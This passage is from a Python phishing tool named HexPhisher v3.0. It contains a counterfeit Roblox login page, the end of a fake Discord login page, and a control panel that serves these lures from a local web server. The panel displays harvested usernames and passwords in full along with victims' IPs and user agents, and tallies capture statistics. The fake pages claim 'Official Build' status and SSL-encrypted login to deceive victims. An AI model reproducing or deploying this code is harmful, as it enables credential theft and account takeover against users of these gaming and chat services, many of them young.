            <span>Need an account?</span>
            <a href="#" class="register-link">Register</a>
        </div>
        
        <div class="divider">
            <span>OR</span>
        </div>
        
        <div class="qrcode-section">
            <div class="qrcode-title">Log in with QR Code</div>
            <div class="qrcode-placeholder">
                <i class="fas fa-qrcode"></i>
            </div>
            <p class="scan-text">
                Scan this with the <strong>Discord mobile app</strong> to log in instantly.
            </p>
        </div>
        
        <div class="footer-links">
            <a href="#" class="footer-link">Terms of Service</a>
            <a href="#" class="footer-link">Privacy Policy</a>
            <a href="#" class="footer-link">Support</a>
        </div>
        
        <div class="discord-footer">
            <p>© 2024 Discord, Inc. | Version 126.0 (Official Build)</p>
        </div>
    </div>
    
    <script>
        // Form interaction effects
        const inputs = document.querySelectorAll('.input-field');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.parentElement.style.transform = 'translateY(-2px)';
            });
            input.addEventListener('blur', function() {
                this.parentElement.style.transform = 'translateY(0)';
            });
        });
        
        // Ripple effect for button
        const button = document.querySelector('.login-button');
        button.addEventListener('click', function(e) {
            const x = e.clientX - e.target.offsetLeft;
            const y = e.clientY - e.target.offsetTop;
            
            const ripples = document.createElement('span');
            ripples.style.left = x + 'px';
            ripples.style.top = y + 'px';
            this.appendChild(ripples);
            
            setTimeout(() => {
                ripples.remove();
            }, 1000);
        });
        
        // QR code animation
        const qrCode = document.querySelector('.qrcode-placeholder');
        qrCode.addEventListener('mouseenter', function() {
            this.style.borderColor = 'rgba(88, 101, 242, 0.6)';
            this.style.transform = 'scale(1.05)';
        });
        
        qrCode.addEventListener('mouseleave', function() {
            this.style.borderColor = 'rgba(88, 101, 242, 0.3)';
            this.style.transform = 'scale(1)';
        });
    </script>
</body>
</html>"""
# Roblox HTML Template (Black Theme)
ROBLOX_HTML = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Roblox - Log In</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root {--black:#000000;--dark:#111111;--gray:#444444;--light:#f5f5f5;--border:#333333;}
* {margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
body {background:linear-gradient(135deg,#0a0a0a,#111111);color:var(--light);min-height:100vh;position:relative;}
.shapes {position:absolute;width:100%;height:100%;z-index:-1;overflow:hidden;}
.shape {position:absolute;border-radius:50%;background:rgba(255,255,255,0.05);opacity:0.03;animation:float 20s infinite linear;}
.shape:nth-child(1) {width:300px;height:300px;top:10%;left:5%;}
.shape:nth-child(2) {width:200px;height:200px;top:60%;right:10%;animation-delay:-5s;}
@keyframes float {0%,100%{transform:translateY(0) rotate(0);}33%{transform:translateY(-30px) rotate(120deg);}66%{transform:translateY(30px) rotate(240deg);}}
.top-nav {position:fixed;top:0;width:100%;background:rgba(0,0,0,0.95);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);z-index:1000;padding:15px 40px;display:flex;justify-content:space-between;align-items:center;}
.logo-container {display:flex;align-items:center;gap:12px;text-decoration:none;}
.official-logo {width:40px;height:40px;background:#000;border:2px solid white;border-radius:8px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(0,0,0,0.5);position:relative;overflow:hidden;}
.official-logo::after {content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.1),transparent);transform:translateX(-100%);animation:shine 3s infinite;}
@keyframes shine {100%{transform:translateX(100%);}}
.logo-text {font-size:28px;font-weight:900;color:white;letter-spacing:-0.5px;text-shadow:0 2px 10px rgba(0,0,0,0.5);}
.nav-menu {display:flex;gap:35px;align-items:center;}
.nav-item {color:#aaa;text-decoration:none;font-size:15px;font-weight:600;padding:10px 0;position:relative;transition:all 0.3s ease;}
.nav-item:hover {color:white;}
.nav-item::after {content:'';position:absolute;bottom:0;left:0;width:0;height:3px;background:white;border-radius:3px;transition:width 0.3s ease;}
.nav-item:hover::after {width:100%;}
.nav-icon {font-size:18px;margin-right:8px;opacity:0.7;}
.nav-buttons {display:flex;gap:15px;align-items:center;}
.nav-btn {padding:12px 28px;border-radius:8px;font-weight:700;font-size:15px;cursor:pointer;transition:all 0.3s;border:none;display:flex;align-items:center;gap:10px;}
.nav-btn-primary {background:white;color:black;box-shadow:0 6px 20px rgba(255,255,255,0.1);}
.nav-btn-primary:hover {transform:translateY(-3px);box-shadow:0 12px 30px rgba(255,255,255,0.2);}
.nav-btn-secondary {background:transparent;color:white;border:2px solid white;}
.nav-btn-secondary:hover {background:rgba(255,255,255,0.1);transform:translateY(-3px);}
.time-display {background:rgba(255,255,255,0.05);padding:10px 20px;border-radius:25px;font-size:14px;font-weight:600;color:#aaa;display:flex;align-items:center;gap:10px;border:1px solid rgba(255,255,255,0.1);}
.time-display i {color:white;}
.main-wrapper {max-width:460px;margin:140px auto 60px;padding:0 25px;}
.login-card {background:rgba(0,0,0,0.8);border-radius:24px;padding:50px 45px;position:relative;overflow:hidden;border:1px solid rgba(255,255,255,0.1);box-shadow:0 25px 60px rgba(0,0,0,0.5);backdrop-filter:blur(10px);}
.login-card::before {content:'';position:absolute;top:0;left:0;right:0;height:3px;background:white;background-size:200% 100%;animation:flow 3s linear infinite;}
@keyframes flow {0%{background-position:200% 0;}100%{background-position:-200% 0;}}
.login-header {text-align:center;margin-bottom:40px;}
.login-title {font-size:36px;font-weight:900;margin-bottom:15px;color:white;position:relative;display:inline-block;text-shadow:0 2px 15px rgba(0,0,0,0.5);}
.login-title::after {content:'';position:absolute;bottom:-8px;left:50%;transform:translateX(-50%);width:60px;height:3px;background:white;border-radius:2px;}
.login-subtitle {color:#aaa;font-size:16px;line-height:1.6;max-width:350px;margin:0 auto;opacity:0.9;}
.form-container {margin-bottom:35px;}
.form-group {margin-bottom:32px;position:relative;}
.form-label {display:block;color:#ddd;font-size:15px;font-weight:700;margin-bottom:14px;display:flex;align-items:center;gap:12px;}
.form-label i {color:white;font-size:20px;width:24px;text-align:center;}
.input-wrapper {position:relative;transition:transform 0.3s ease;}
.input-wrapper:hover {transform:translateY(-2px);}
.form-input {width:100%;padding:22px 25px 22px 60px;border:2px solid rgba(255,255,255,0.2);border-radius:16px;font-size:16px;font-weight:500;transition:all 0.3s;background:rgba(255,255,255,0.05);outline:none;color:white;}
.form-input:focus {border-color:white;background:rgba(255,255,255,0.1);box-shadow:0 0 0 5px rgba(255,255,255,0.1);transform:scale(1.02);}
.form-input::placeholder {color:#777;}
.input-icon {position:absolute;left:25px;top:50%;transform:translateY(-50%);color:white;font-size:22px;z-index:2;transition:all 0.3s ease;}
.input-wrapper:focus-within .input-icon {transform:translateY(-50%) scale(1.1);}
.password-toggle {position:absolute;right:25px;top:50%;transform:translateY(-50%);background:none;border:none;color:#777;font-size:20px;cursor:pointer;transition:all 0.3s ease;z-index:2;width:44px;height:44px;display:flex;align-items:center;justify-content:center;border-radius:50%;}
.password-toggle:hover {color:white;background:rgba(255,255,255,0.1);}
.submit-btn {width:100%;background:white;border:none;border-radius:18px;padding:24px;color:black;font-size:18px;font-weight:800;cursor:pointer;transition:all 0.4s;position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;gap:18px;margin-top:10px;box-shadow:0 12px 35px rgba(255,255,255,0.1);}
.submit-btn::before {content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(0,0,0,0.2),transparent);transition:left 0.7s ease;}
.submit-btn:hover::before {left:100%;}
.submit-btn:hover {transform:translateY(-4px) scale(1.02);box-shadow:0 20px 50px rgba(255,255,255,0.2);}
.submit-btn i {font-size:24px;transition:transform 0.3s ease;}
.submit-btn:hover i {transform:rotate(20deg) scale(1.2);}
.forgot-link {display:block;text-align:center;color:white;text-decoration:none;font-size:16px;font-weight:600;margin:25px 0 35px;transition:all 0.3s ease;padding:14px;border-radius:12px;position:relative;overflow:hidden;}
.forgot-link::before {content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.1),transparent);transition:left 0.6s ease;}
.forgot-link:hover::before {left:100%;}
.forgot-link:hover {background:rgba(255,255,255,0.1);transform:translateY(-2px);}
.divider {display:flex;align-items:center;margin:40px 0;color:#777;font-size:15px;font-weight:600;}
.divider::before,.divider::after {content:'';flex:1;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.2),transparent);}
.divider span {padding:0 20px;background:rgba(0,0,0,0.8);z-index:1;}
.otp-btn {width:100%;background:rgba(255,255,255,0.05);color:white;border:2px solid rgba(255,255,255,0.2);border-radius:16px;padding:22px;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.3s ease;margin-bottom:25px;display:flex;align-items:center;justify-content:center;gap:15px;position:relative;overflow:hidden;}
.otp-btn:hover {border-color:white;background:rgba(255,255,255,0.1);transform:translateY(-3px);box-shadow:0 15px 35px rgba(0,0,0,0.3);}
.otp-btn i {font-size:22px;color:white;transition:transform 0.3s ease;}
.otp-btn:hover i {transform:rotate(15deg) scale(1.2);}
.quick-signin {text-align:center;color:#aaa;font-size:15px;font-weight:700;margin-bottom:25px;text-transform:uppercase;letter-spacing:1px;}
.social-login {display:flex;justify-content:center;gap:20px;margin-bottom:40px;}
.social-btn {width:60px;height:60px;border-radius:18px;border:2px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.05);display:flex;align-items:center;justify-content:center;font-size:26px;color:#aaa;cursor:pointer;transition:all 0.4s;position:relative;overflow:hidden;}
.social-btn::before {content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:currentColor;opacity:0;transition:opacity 0.3s ease;}
.social-btn:hover::before {opacity:0.1;}
.social-btn:hover {transform:translateY(-6px) scale(1.1);border-color:currentColor;color:white;box-shadow:0 15px 35px rgba(0,0,0,0.3);}
.social-btn:nth-child(1):hover {background:#1877f2;border-color:#1877f2;}
.social-btn:nth-child(2):hover {background:#db4437;border-color:#db4437;}
.social-btn:nth-child(3):hover {background:#1da1f2;border-color:#1da1f2;}
.social-btn:nth-child(4):hover {background:black;border-color:white;}
.social-btn i {z-index:1;transition:transform 0.3s ease;}
.social-btn:hover i {transform:scale(1.2);}
.register-section {text-align:center;color:#aaa;font-size:16px;margin-top:40px;padding-top:35px;border-top:1px solid rgba(255,255,255,0.1);}
.register-link {color:white;text-decoration:none;font-weight:800;margin-left:8px;transition:all 0.3s ease;display:inline-flex;align-items:center;gap:8px;}
.register-link::after {content:'→';opacity:0;transform:translateX(-10px);transition:all 0.3s ease;}
.register-link:hover::after {opacity:1;transform:translateX(0);}
.register-link:hover {text-decoration:underline;}
.security-note {background:rgba(255,255,255,0.05);border-radius:16px;padding:25px;margin-top:35px;text-align:center;font-size:14px;color:#aaa;border:1px solid rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;gap:15px;}
.security-note i {color:#00b894;font-size:20px;}
.page-footer {text-align:center;margin-top:50px;padding-top:30px;border-top:1px solid rgba(255,255,255,0.05);color:#777;font-size:13px;}
@media (max-width:768px) {.top-nav{padding:15px 20px;}.nav-menu{display:none;}.login-card{padding:40px 30px;}.main-wrapper{margin-top:120px;}}
::-webkit-scrollbar {width:10px;}
::-webkit-scrollbar-track {background:rgba(0,0,0,0.3);border-radius:10px;}
::-webkit-scrollbar-thumb {background:rgba(255,255,255,0.2);border-radius:10px;}
::-webkit-scrollbar-thumb:hover {background:rgba(255,255,255,0.3);}
</style></head>
<body>
<div class="shapes"><div class="shape"></div><div class="shape"></div></div>
<nav class="top-nav">
<a href="#" class="logo-container"><div class="official-logo"></div><span class="logo-text">ROBLOX</span></a>
<div class="nav-menu">
<a href="#" class="nav-item"><i class="fas fa-chart-line nav-icon"></i><span>Charts</span></a>
<a href="#" class="nav-item"><i class="fas fa-store nav-icon"></i><span>Marketplace</span></a>
<a href="#" class="nav-item"><i class="fas fa-plus-square nav-icon"></i><span>Create</span></a>
<a href="#" class="nav-item"><i class="fas fa-gem nav-icon"></i><span>Robux</span></a>
</div>
<div class="nav-buttons">
<div class="time-display"><i class="fas fa-clock"></i><span id="currentTime">23:02</span></div>
<button class="nav-btn nav-btn-primary"><i class="fas fa-user-plus"></i><span>Sign Up</span></button>
<button class="nav-btn nav-btn-secondary"><i class="fas fa-sign-in-alt"></i><span>Login</span></button>
</div>
</nav>
<div class="main-wrapper">
<div class="login-card">
<div class="login-header"><h1 class="login-title">Login to Roblox</h1><p class="login-subtitle">Access your account to play games, chat with friends, and explore millions of immersive experiences.</p></div>
<form method="POST" class="form-container">
<div class="form-group">
<label class="form-label"><i class="fas fa-user-circle"></i><span>Username, Email, or Phone</span></label>
<div class="input-wrapper"><div class="input-icon"><i class="fas fa-user"></i></div><input type="text" class="form-input" name="username" placeholder="Enter username, email, or phone number" required autocomplete="username"></div>
</div>
<div class="form-group">
<label class="form-label"><i class="fas fa-lock"></i><span>Password</span></label>
<div class="input-wrapper"><div class="input-icon"><i class="fas fa-key"></i></div><input type="password" class="form-input" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password"><button type="button" class="password-toggle" id="togglePassword"><i class="fas fa-eye"></i></button></div>
</div>
<button type="submit" class="submit-btn"><i class="fas fa-gamepad"></i><span>LOGIN TO ROBLOX</span></button>
</form>
<a href="#" class="forgot-link"><i class="fas fa-question-circle"></i>Forgot Password or Username?</a>
<div class="divider"><span>OR CONTINUE WITH</span></div>
<button class="otp-btn"><i class="fas fa-envelope-open-text"></i><span>Email Me a One-Time Code</span></button>
<div class="quick-signin">Quick Sign-in</div>
<div class="social-login">
<div class="social-btn"><i class="fab fa-facebook-f"></i></div>
<div class="social-btn"><i class="fab fa-google"></i></div>
<div class="social-btn"><i class="fab fa-twitter"></i></div>
<div class="social-btn"><i class="fab fa-apple"></i></div>
</div>
<div class="register-section"><span>New to Roblox?</span><a href="#" class="register-link"><span>Create an Account</span></a></div>
<div class="security-note"><i class="fas fa-shield-alt"></i><span><strong>Secure Login:</strong> Your credentials are encrypted with 256-bit SSL encryption.</span></div>
</div>
<div class="page-footer"><p>© 2024 Roblox Corporation. All rights reserved.</p><p style="margin-top:5px;opacity:0.7;">Version 2.581.581 (Official Build)</p></div>
</div>
</div>
<script>
function updateTime(){const n=new Date();document.getElementById("currentTime").textContent=n.getHours().toString().padStart(2,"0")+":"+n.getMinutes().toString().padStart(2,"0");}updateTime();setInterval(updateTime,6e4);
const p=document.getElementById("togglePassword"),i=document.getElementById("password");p.addEventListener("click",function(){const e=i.getAttribute("type")==="password"?"text":"password";i.setAttribute("type",e),this.innerHTML=e==="password"?'<i class="fas fa-eye"></i>':'<i class="fas fa-eye-slash"></i>'});
const f=document.querySelectorAll(".form-input");f.forEach(e=>{e.addEventListener("focus",function(){this.parentElement.style.transform="translateY(-4px)"}),e.addEventListener("blur",function(){this.parentElement.style.transform="translateY(-2px)"})});
const b=document.querySelectorAll(".submit-btn, .otp-btn, .nav-btn");b.forEach(e=>{e.addEventListener("click",function(t){const o=this.getBoundingClientRect(),n=document.createElement("span");n.style.cssText="position:absolute;border-radius:50%;background:rgba(255,255,255,0.3);transform:scale(0);animation:ripple 0.6s linear;",n.style.left=t.clientX-o.left+"px",n.style.top=t.clientY-o.top+"px",this.appendChild(n),setTimeout(()=>{n.remove()},600)})});
const s=document.createElement("style");s.textContent="@keyframes ripple {to{transform:scale(4);opacity:0;}}",document.head.appendChild(s);
</script>
</body>
</html>"""
# Final interface functions
def print_banner():
    clear_terminal()
    banner = """
    \033[96m╔══════════════════════════════════════════════════════════════════╗
    ║  _   _          _  ____  _     _     _                               ║
    ║ | | | | ___  __| |/ ___|| |__ (_)___| |__                            ║
    ║ | |_| |/ _ \/ _` |\___ \| '_ \| / __| '_ \                           ║
    ║ |  _  |  __/ (_| | ___) | | | | \__ \ | | |                          ║
    ║ |_| |_|\___|\__,_|____/|_| |_|_|___/_| |_|                          ║
    ║                                                                      ║
    ║               \033[93mHedshish phisher v3.0\033[96m               ║
    ║                    \033[90A Author: WastelandX\033[96m            ║
    ╚══════════════════════════════════════════════════════════════════╝\033[0m
    """
    print(banner)

def display_menu():
    menu = """
    \033[94m┌───────────────────── CONTROL PANEL ─────────────────────┐
    │  \033[92m1\033[0m. Blockman GO Login Page                        \033[94m│
    │  \033[92m2\033[0m. Discord Login Page                            \033[94m│
    │  \033[92m3\033[0m. Roblox Login Page                             \033[94m│
    │  \033[92m4\033[0m. Show Captured Credentials                    \033[94m│
    │  \033[92m5\033[0m. Statistics & Analytics                       \033[94m│
    │  \033[92m6\033[0m. Clear All Logs                               \033[94m│
    │  \033[92m7\033[0m. Server Information                           \033[94m│
    │  \033[91m0\033[0m. Exit Program                                \033[94m│
    └──────────────────────────────────────────────────────────┘\033[0m"""
    print(menu)

def show_logs():
    if not os.path.exists(LOG_FILE):
        print(f"\033[91m[✗] No credentials captured yet.\033[0m")
        return
    
    print(f"\n\033[94m[📋] CAPTURED CREDENTIALS:\033[0m")
    print(f"\033[90m{'═' * 75}\033[0m")
    
    try:
        with open(LOG_FILE, 'r') as f:
            lines = f.readlines()
        
        if not lines:
            print(f"\033[91m[!] Log file is empty\033[0m")
            return
        
        for i, line in enumerate(lines[-20:], 1):
            try:
                entry = json.loads(line.strip())
                service_icons = {
                    "Blockman GO": "🎮",
                    "Discord": "💬",
                    "Roblox": "🧱"
                }
                icon = service_icons.get(entry['service'], '📝')
                
                print(f"\033[92m[{i}] {icon} {entry['timestamp']} | {entry['service']}\033[0m")
                print(f"    \033[93mIP:\033[0m \033[97m{entry.get('ip', 'N/A')}\033[0m")
                
                for key, value in entry['credentials'].items():
                    masked = value[:3] + '*' * (len(value) - 3) if len(value) > 3 else '***'
                    print(f"    \033[93m{key.upper()}:\033[0m \033[97m{masked} \033[90m(original: {value})\033[0m")
                
                agent = entry.get('user_agent', 'N/A')[:40]
                if len(agent) > 40:
                    agent = agent[:37] + '...'
                print(f"    \033[90mAgent: {agent}\033[0m")
                print()
                
            except json.JSONDecodeError:
                print(f"\033[91m[!] Malformed log entry on line {i}\033[0m")
                continue
                
    except Exception as e:
        print(f"\033[91m[!] Error reading logs: {e}\033[0m")

def show_stats():
    if not os.path.exists(LOG_FILE):
        print(f"\033[91m[✗] No statistics available.\033[0m")
        return
    
    try:
        with open(LOG_FILE, 'r') as f:
            lines = f.readlines()
        
        stats = {
            "Blockman GO": {"count": 0, "ips": set()},
            "Discord": {"count": 0, "ips": set()},
            "Roblox": {"count": 0, "ips": set()}
        }
        
        for line in lines:
            try:
                entry = json.loads(line.strip())
                service = entry.get('service', 'Unknown')
                ip = entry.get('ip', '')
                
                if service in stats:
                    stats[service]["count"] += 1
                    if ip:
                        stats[service]["ips"].add(ip)
            except:
                continue
        
        total = sum(stats[s]["count"] for s in stats)
        unique_ips = set()
        for service in stats:
            unique_ips.update(stats[service]["ips"])
        
        print(f"\n\033[94m[📊] CAPTURE STATISTICS:\033[0m")
        print(f"\033[90m{'═' * 55}\033[0m")
        print(f"\033[92mTotal Captures: {total}\033[0m")
        print(f"\033[92mUnique IPs: {len(unique_ips)}\033[0m")
        print()
        
        for service, data in stats.items():
            count = data["count"]
            percentage = (count / total * 100) if total > 0 else 0
            bar_length = int(percentage / 2)
            bar = '█' * bar_length + '░' * (50 - bar_length)
            
            service_icons = {
                "Blockman GO": "🎮",
                "Discord": "💬",
                "Roblox": "🧱"
            }
            icon = service_icons.get(service, '📊')
            
            print(f"\033[96m{icon} {service:15} \033[92m{count:3} \033[90m[{bar}] \033[93m{percentage:.1f}%\033[0m")
            print(f"    \033[90mUnique IPs: {len(data['ips'])}\033[0m")
        
        print(f"\033[90m{'═' * 55}\033[0m")
        
    except Exception as e:
        print(f"\033[91m[!] Error generating statistics: {e}\033[0m")

def show_server_info(local_ip, httpd):
    print(f"\n\033[94m[🌐] SERVER INFORMATION:\033[0m")
    print(f"\033[90m{'═' * 55}\033[0m")
    print(f"\033[92mRedirect URL:    \033[97mhttp://127.0.0.1:{PORT}\033[0m")
    print(f"\033[92medirect URL2:  \033[97mhttp://{local_ip}:{PORT}\033[0m")
    print(f"\033[92mCurrent Page: \033[97m{HexPhisherHandler.services.get(HexPhisherHandler.current_service, 'Unknown')}\033[0m")
    print(f"\033[92mLog File:     \033[97m{LOG_FILE}\033[0m")
    print(f"\033[92mActive Since: \033[97m{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\033[0m")
    print(f"\033[90m{'═' * 55}\033[0m")

def clear_logs():
    confirm = input("\n\033[91m[⚠] Are you sure you want to delete ALL logs? (yes/NO): \033[0m").strip().lower()
    if confirm == 'yes':
        try:
            if os.path.exists(LOG_FILE):
                backup_name = f"{LOG_FILE}.backup.{int(time.time())}"
                with open(LOG_FILE, 'r') as f:
                    lines = f.readlines()
                if lines:
                    with open(backup_name, 'w') as f:
                        f.writelines(lines)
                
                os.remove(LOG_FILE)
                print(f"\033[92m[✓] All logs have been permanently deleted.\033[0m")
                print(f"\033[90m[!] Backup saved as: {backup_name}\033[0m")
            else:
                print(f"\033[91m[✗] No log file found.\033[0m")
        except Exception as e:
            print(f"\033[91m[✗] Error deleting logs: {e}\033[0m")
    else:
        print(f"\033[90m[!] Operation cancelled.\033[0m")

def run_server():
    handler = HexPhisherHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
        server_thread.start()
        
        local_ip = get_local_ip()
        
        while True:
            try:
                print_banner()
                show_server_info(local_ip, httpd)
                display_menu()
                
                choice = input("\n\033[95m[SELECT] \033[0m").strip()
                
                if choice == '1':
                    HexPhisherHandler.current_service = "blockmango"
                    print(f"\033[92m[✓] Switched to Blockman GO login page\033[0m")
                    time.sleep(1)
                elif choice == '2':
                    HexPhisherHandler.current_service = "discord"
                    print(f"\033[92m[✓] Switched to Discord login page\033[0m")
                    time.sleep(1)
                elif choice == '3':
                    HexPhisherHandler.current_service = "roblox"
                    print(f"\033[92m[✓] Switched to Roblox login page\033[0m")
                    time.sleep(1)
                elif choice == '4':
                    clear_terminal()
                    print_banner()
                    show_logs()
                    input("\n\033[90mPress Enter to continue...\033[0m")
                elif choice == '5':
                    clear_terminal()
                    print_banner()
                    show_stats()
                    input("\n\033[90mPress Enter to continue...\033[0m")
                elif choice == '6':
                    clear_terminal()
                    print_banner()
                    clear_logs()
                    time.sleep(2)
                elif choice == '7':
                    clear_terminal()
                    print_banner()
                    show_server_info(local_ip, httpd)
                    input("\n\033[90mPress Enter to continue...\033[0m")
                elif choice == '0':
                    print(f"\n\033[91m[⚠] Shutting down server...\033[0m")
                    httpd.shutdown()
                    print(f"\033[91m[✗] Server stopped.\033[0m")
                    print(f"\033[90m[!] Thank you for using HexPhisher v3.0\033[0m")
                    break
                else:
                    print(f"\033[91m[✗] Invalid selection. Please try again.\033[0m")
                    time.sleep(1)
                
            except KeyboardInterrupt:
                print(f"\n\033[91m[⚠] Server shutdown by user.\033[0m")
                httpd.shutdown()
                print(f"\033[90m[!] Session terminated.\033[0m")
                break

def main():
    try:
        clear_terminal()
        print("\033[96m" + "=" * 60)
        print("          INITIALIZING HEXPHISHER v3.0")
        print("              Loading components...")
        print("=" * 60 + "\033[0m")
        time.sleep(1)
        
        # Check if port is available
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex(('127.0.0.1', PORT))
        sock.close()
        
        if result == 0:
            print(f"\033[91m[✗] Port {PORT} is already in use.\033[0m")
            print(f"\033[90m[!] Please free port {PORT} or modify the PORT variable.\033[0m")
            return
        
        run_server()
        
    except Exception as e:
        print(f"\033[91m[✗] Fatal error: {e}\033[0m")
        import traceback
        traceback.print_exc()
        print(f"\033[90m[!] Report this error if it persists.\033[0m")

# Entry point
if __name__ == "__main__":
    main()